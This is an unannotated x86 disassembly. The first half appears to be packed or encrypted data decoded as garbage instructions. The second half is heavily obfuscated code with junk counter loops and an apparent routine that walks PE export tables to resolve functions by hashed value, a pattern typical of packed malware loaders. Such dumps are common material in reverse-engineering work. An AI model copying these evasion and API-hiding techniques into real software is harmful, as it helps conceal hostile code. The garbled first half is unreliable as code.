  405892:	cmp    al,0x9c
  405894:	ins    DWORD PTR es:[edi],dx
  405895:	in     al,dx
  405896:	mov    dl,0x63
  405898:	xor    bl,dl
  40589a:	xor    bl,BYTE PTR [esi]
  40589c:	jne    0x40587f
  40589e:	or     bl,BYTE PTR [edi-0x66]
  4058a1:	mov    bh,0xf6
  4058a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058a4:	cdq    
  4058a5:	sbb    bl,ch
  4058a7:	inc    ebx
  4058a8:	repz sub DWORD PTR [ecx-0x7b],ebx
  4058ac:	xor    edi,edx
  4058ae:	ins    DWORD PTR es:[edi],dx
  4058af:	pop    edi
  4058b0:	stc    
  4058b1:	mov    BYTE PTR [ebp+0x56],dl
  4058b4:	mov    dl,0x55
  4058b6:	sub    eax,0xff19f94b
  4058bb:	sti    
  4058bc:	mov    dl,0x5f
  4058be:	dec    eax
  4058bf:	sub    esi,DWORD PTR [edi+edx*4]
  4058c2:	pusha  
  4058c3:	sbb    eax,0xad692db4
  4058c8:	ret    
  4058c9:	pop    edi
  4058ca:	je     0x4058db
  4058cc:	in     al,0x24
  4058ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058cf:	(bad)  
  4058d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058d1:	(bad)  
  4058d2:	jno    0x405889
  4058d4:	push   0x6d
  4058d6:	cld    
  4058d7:	mov    edx,0x18fc6ae8
  4058dc:	jge    0x4058cb
  4058de:	xlat   BYTE PTR ds:[ebx]
  4058df:	xchg   BYTE PTR [ebp+edx*2-0x24],al
  4058e3:	or     esp,DWORD PTR [edx+0x0]
  4058e6:	das    
  4058e7:	xlat   BYTE PTR ds:[ebx]
  4058e8:	fwait
  4058e9:	ja     0x405880
  4058eb:	lock loopne 0x405879
  4058ee:	pop    ebp
  4058ef:	dec    esp
  4058f0:	jnp    0x405876
  4058f2:	sub    eax,0x5c31f121
  4058f7:	lods   eax,DWORD PTR ds:[esi]
  4058f8:	cmp    cl,bl
  4058fa:	mov    esi,0x93ae2d24
  4058ff:	sbb    BYTE PTR [esi-0x40],0x56
  405903:	ds cmp bl,bh
  405906:	inc    ebx
  405907:	fldenv [esi+0x26]
  40590a:	pop    es
  40590b:	(bad)  
  40590c:	rcl    DWORD PTR [edx+0x1ea21495],1
  405912:	inc    ebx
  405913:	ficomp WORD PTR [eax-0x594f5fe0]
  405919:	test   DWORD PTR [ecx],ebx
  40591b:	sbb    bh,BYTE PTR [ecx-0x39]
  40591e:	mov    esi,0x689812ee
  405923:	(bad)  
  405924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405925:	dec    ebx
  405926:	xor    eax,0x6ce1e1db
  40592b:	stc    
  40592c:	cmp    al,0xf4
  40592e:	hlt    
  40592f:	dec    ecx
  405930:	add    DWORD PTR [edi-0x27f45615],edi
  405936:	and    ch,BYTE PTR [edi-0x26]
  405939:	add    eax,0xcb8449b7
  40593e:	in     al,dx
  40593f:	scas   al,BYTE PTR es:[edi]
  405940:	mov    BYTE PTR [ebp+0x31b1010],al
  405946:	xchg   edi,eax
  405947:	data16 mov dh,0xf4
  40594a:	cmp    BYTE PTR [ebx-0x6e],0xf1
  40594e:	loop   0x4058d4
  405950:	jge    0x405953
  405952:	fistp  WORD PTR [ebx+ebp*1]
  405955:	pop    edi
  405956:	mov    ds:0x89edad1d,al
  40595b:	pop    esi
  40595c:	not    eax
  40595e:	pop    dx
  405960:	mov    ecx,0xf4d4e98f
  405965:	mov    esp,0x6032f1a1
  40596a:	fild   WORD PTR [eax+0x3ce33146]
  405970:	mov    ebx,0xc3deb481
  405975:	inc    ecx
  405976:	js     0x405949
  405978:	mov    WORD PTR [eax],?
  40597a:	loopne 0x405927
  40597c:	mov    ecx,0x76522c48
  405981:	add    al,0xfe
  405983:	shr    BYTE PTR [eax],cl
  405985:	adc    DWORD PTR [eax+0x2c2a01d3],eax
  40598b:	push   ebp
  40598c:	or     cl,BYTE PTR [eax+0x647cdd20]
  405992:	or     bh,ch
  405994:	mov    ah,0x67
  405997:	das    
  405998:	scas   al,BYTE PTR es:[edi]
  405999:	push   es
  40599a:	lods   al,BYTE PTR ds:[esi]
  40599b:	js     0x4059bb
  40599d:	ins    BYTE PTR es:[edi],dx
  40599e:	pop    ebx
  40599f:	push   0xa
  4059a1:	loopne 0x405945
  4059a3:	push   edx
  4059a4:	add    ebx,DWORD PTR [edi+edx*8-0x16638195]
  4059ab:	sub    ch,al
  4059ad:	fld    QWORD PTR [edx+0x670513d5]
  4059b3:	inc    edx
  4059b4:	mov    al,BYTE PTR [ebp+0x69f750b6]
  4059ba:	(bad)  
  4059bb:	fstp   TBYTE PTR [ecx]
  4059bd:	loopne 0x405a06
  4059bf:	mov    es,esi
  4059c1:	test   al,0xc7
  4059c3:	ds push es
  4059c5:	jb     0x405a07
  4059c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059c8:	fdiv   QWORD PTR [esi+0x7bb8747c]
  4059ce:	stos   DWORD PTR es:[edi],eax
  4059cf:	jmp    0x4059a1
  4059d1:	push   ds
  4059d2:	adc    BYTE PTR [edi-0x3b],0x6d
  4059d6:	gs std 
  4059d8:	add    al,0x45
  4059da:	ret    0x9841
  4059dd:	inc    edi
  4059de:	popa   
  4059df:	cmc    
  4059e0:	xor    dh,BYTE PTR [ebp-0x405ae19c]
  4059e6:	mov    bh,0x42
  4059e8:	stc    
  4059e9:	sahf   
  4059ea:	adc    eax,0x987bc8aa
  4059ef:	xchg   ebp,eax
  4059f0:	mov    esi,0xd0e367c8
  4059f5:	or     BYTE PTR [ebx-0x40],0x28
  4059f9:	or     al,0x25
  4059fc:	push   esi
  4059fd:	outs   dx,DWORD PTR ds:[esi]
  4059fe:	ss jbe 0x405a18
  405a01:	scas   al,BYTE PTR es:[edi]
  405a02:	push   es
  405a03:	inc    esi
  405a04:	inc    ebx
  405a05:	aam    0x6e
  405a07:	pop    edx
  405a08:	push   ecx
  405a09:	mov    ebp,0x88489ac2
  405a0e:	mov    al,0x40
  405a10:	(bad)  
  405a11:	icebp  
  405a12:	cmp    al,0x6e
  405a14:	pop    ecx
  405a15:	test   eax,0x7a8aa022
  405a1a:	push   ds
  405a1b:	xlat   BYTE PTR ds:[ebx]
  405a1c:	adc    ah,bh
  405a1e:	dec    esi
  405a1f:	adc    ah,ah
  405a21:	adc    ebp,DWORD PTR [eax+0x11c43b7e]
  405a27:	in     eax,0x72
  405a29:	ins    DWORD PTR es:[edi],dx
  405a2a:	cmp    al,0x75
  405a2c:	out    0x80,eax
  405a2e:	sub    DWORD PTR [edi],ecx
  405a30:	mov    dh,0x4e
  405a32:	xchg   ecx,eax
  405a33:	test   BYTE PTR [ebx-0x75e1a212],cl
  405a39:	and    al,0xc
  405a3b:	lds    edi,FWORD PTR ds:0x2f23166c
  405a41:	js     0x405a2d
  405a43:	mov    esp,0x1692ca20
  405a48:	ins    DWORD PTR es:[edi],dx
  405a49:	inc    eax
  405a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a4b:	mov    BYTE PTR [ecx],ch
  405a4d:	(bad)  
  405a4e:	(bad)  
  405a50:	jns    0x405a40
  405a52:	repz xor eax,0x7569987c
  405a58:	int3   
  405a59:	popf   
  405a5a:	cmp    BYTE PTR [edx],cl
  405a5c:	out    0x6c,eax
  405a5e:	addr16 add eax,0x8511272d
  405a64:	outs   dx,BYTE PTR ds:[esi]
  405a65:	rcl    BYTE PTR [eax-0x72],cl
  405a68:	inc    edx
  405a69:	mov    bh,0xb6
  405a6b:	jb     0x405a04
  405a6d:	pop    es
  405a6e:	and    eax,0xb22657ae
  405a73:	push   ecx
  405a74:	xchg   esi,eax
  405a75:	fwait
  405a76:	mov    edi,0xd9d04221
  405a7b:	and    DWORD PTR [edi-0x7b3bf061],esi
  405a81:	ret    
  405a82:	aaa    
  405a83:	push   esi
  405a84:	pop    esp
  405a85:	test   al,0x27
  405a87:	out    dx,al
  405a88:	xor    bh,al
  405a8a:	lea    ebx,[esp+eiz*2]
  405a8d:	push   ds
  405a8e:	cli    
  405a8f:	xlat   BYTE PTR ds:[ebx]
  405a90:	add    eax,0xa1685c23
  405a95:	es in  eax,0xc9
  405a98:	(bad)  
  405a99:	test   DWORD PTR [edi+0x60daa19b],0xfeaacf06
  405aa3:	inc    edx
  405aa4:	xor    eax,0x48ed9fcd
  405aa9:	into   
  405aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aab:	shl    DWORD PTR [ebx+0x46],cl
  405aae:	pop    eax
  405aaf:	shl    DWORD PTR [edx-0x77baecbb],1
  405ab5:	out    dx,eax
  405ab6:	and    eax,0x4462a0d7
  405abb:	test   DWORD PTR [edx+0x2fbda859],eax
  405ac1:	out    0x6b,al
  405ac3:	sbb    DWORD PTR [eax-0x1e],0x47534b0c
  405aca:	mov    edx,0x4177abef
  405acf:	cdq    
  405ad0:	leave  
  405ad1:	in     eax,dx
  405ad2:	(bad)  
  405ad3:	fidiv  DWORD PTR [edi+edi*2+0x512515f6]
  405ada:	inc    ebx
  405adb:	test   al,0x3b
  405add:	shl    DWORD PTR [esi-0x76],cl
  405ae0:	mov    al,0x40
  405ae2:	test   BYTE PTR [edi],0xb7
  405ae5:	(bad)  [eax-0x629b933b]
  405aeb:	int3   
  405aec:	push   ebx
  405aed:	cmp    dh,BYTE PTR [edi-0x22a8133f]
  405af3:	jmp    0x64c49233
  405af8:	adc    BYTE PTR [edx],bl
  405afa:	xor    DWORD PTR [ecx+0x57a39fa2],edi
  405b00:	leave  
  405b01:	lea    eax,[edi+0x5f]
  405b04:	rcr    ch,cl
  405b06:	inc    eax
  405b07:	pop    edx
  405b08:	sbb    al,0xcf
  405b0a:	xchg   ecx,eax
  405b0b:	mov    WORD PTR [ecx+0x4c61a436],es
  405b11:	sub    al,BYTE PTR [eax-0x3f]
  405b14:	mov    edi,0x1c57ad4f
  405b19:	mov    ecx,ecx
  405b1b:	sbb    edi,edx
  405b1d:	adc    DWORD PTR [edx+ebp*8+0x35],ebx
  405b21:	fistp  DWORD PTR [ecx+eax*1]
  405b24:	pop    ebx
  405b25:	mov    bh,0xd0
  405b27:	jo     0x405b19
  405b29:	fnstenv [ebx+0x64]
  405b2c:	gs retf 0xd02c
  405b30:	sahf   
  405b31:	jl     0x405b86
  405b33:	xchg   ebx,eax
  405b34:	int3   
  405b35:	cs mov cl,0x9d
  405b38:	mov    ch,0xc8
  405b3a:	daa    
  405b3b:	rol    BYTE PTR [edi],0xcb
  405b3e:	das    
  405b3f:	fdivp  st(3),st
  405b41:	inc    DWORD PTR [ebx-0x55]
  405b44:	xchg   ebx,eax
  405b45:	addr16 lock push ecx
  405b48:	das    
  405b49:	add    eax,0x17dc6635
  405b4e:	out    0x76,eax
  405b50:	repnz mov DWORD PTR [ecx+ebp*4+0x205f4988],ebx
  405b58:	fist   WORD PTR [ecx+0x3f]
  405b5b:	cmp    edi,eax
  405b5d:	mov    ecx,0x7c4f7c
  405b62:	sbb    eax,0x57676010
  405b67:	cli    
  405b68:	mov    ecx,0xcf1e8081
  405b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b6e:	sub    BYTE PTR [esi],cl
  405b70:	retf   0x410b
  405b73:	mov    ch,0x19
  405b75:	sub    dh,bh
  405b77:	in     eax,0x1d
  405b79:	outs   dx,DWORD PTR ds:[esi]
  405b7a:	hlt    
  405b7b:	sub    cl,BYTE PTR [esi]
  405b7d:	xor    al,0x96
  405b7f:	xor    esi,DWORD PTR [edx+0x2e]
  405b82:	loopne 0x405b1b
  405b84:	ror    DWORD PTR [eax-0xae3c18b],0x75
  405b8b:	(bad)
  405b8e:	dec    edi
  405b8f:	mov    BYTE PTR [esi+ecx*4-0x70],dh
  405b93:	lods   al,BYTE PTR ds:[esi]
  405b94:	cmp    bl,BYTE PTR [edx+0x2c]
  405b97:	rol    BYTE PTR ds:0x1f61a305,0x62
  405b9e:	adc    bh,BYTE PTR [eax-0x12]
  405ba1:	push   edx
  405ba2:	or     DWORD PTR [edi+0x5d592c4],esi
  405ba8:	pop    esp
  405ba9:	aam    0x79
  405bab:	xor    eax,0x7b2aba28
  405bb0:	sub    BYTE PTR [ebp+0x7d],bh
  405bb3:	sub    cl,BYTE PTR [edx-0x5b08ba24]
  405bb9:	jne    0x405c0c
  405bbb:	sbb    al,0xc4
  405bbd:	lea    edx,[ecx]
  405bbf:	mov    di,bx
  405bc2:	jbe    0x405be3
  405bc4:	sbb    al,0x60
  405bc6:	fadd   QWORD PTR [ebx+0x1a8aeeda]
  405bcc:	je     0x405c07
  405bce:	cmp    DWORD PTR [eax+0x20],ebx
  405bd1:	fxch   st(1)
  405bd3:	lds    edx,FWORD PTR [edx+edx*1]
  405bd6:	add    edi,esi
  405bd8:	cmc    
  405bd9:	test   al,0x84
  405bdb:	cdq    
  405bdc:	and    esi,DWORD PTR [ecx+0x28fc876]
  405be2:	ret    
  405be3:	aam    0x52
  405be5:	jb     0x405ba4
  405be7:	nop
  405be8:	sub    DWORD PTR [ecx],eax
  405bea:	push   0xffffffc0
  405bec:	ins    BYTE PTR es:[edi],dx
  405bed:	or     eax,0xdaac8c54
  405bf2:	jo     0x405c55
  405bf4:	jl     0x405c49
  405bf6:	or     bl,BYTE PTR [edi+eax*8]
  405bf9:	jecxz  0x405bf2
  405bfb:	fwait
  405bfc:	jmp    0x405c3f
  405bfe:	push   es
  405bff:	inc    ebx
  405c00:	mov    BYTE PTR [ebx+0x64],cl
  405c03:	call   0x1600:0x1a24283a
  405c0a:	push   edi
  405c0b:	dec    edi
  405c0c:	cmp    eax,ebp
  405c0e:	mov    eax,ds:0x1178736f
  405c13:	fwait
  405c14:	rcr    eax,1
  405c16:	mov    ah,0xec
  405c18:	fst    DWORD PTR [ebx-0x24]
  405c1b:	mov    edi,0x744b3f9d
  405c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c21:	retf   0x4563
  405c24:	pop    ds
  405c25:	sub    al,0xee
  405c27:	or     eax,esi
  405c29:	mov    cl,dh
  405c2b:	sub    DWORD PTR [ebp+0x6a7b2a42],edx
  405c31:	push   0x199da390
  405c36:	pop    esp
  405c37:	jns    0x405c9c
  405c39:	and    ch,al
  405c3b:	fucomip st,st(5)
  405c3d:	adc    bl,BYTE PTR [esi-0x2ed7cbbe]
  405c43:	(bad)  
  405c44:	outs   dx,DWORD PTR ds:[esi]
  405c45:	mov    BYTE PTR [eax],bh
  405c47:	xor    BYTE PTR [edi+0x1ae2a132],al
  405c4d:	inc    edx
  405c4e:	add    bh,bh
  405c50:	xor    bh,bh
  405c52:	xor    eax,0x421d3e
  405c57:	push   DWORD PTR ds:0x421aea
  405c5d:	push   DWORD PTR ds:0x421d1e
  405c63:	push   DWORD PTR ds:0x421db2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421ce2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423847
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423806
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a72
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423992
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
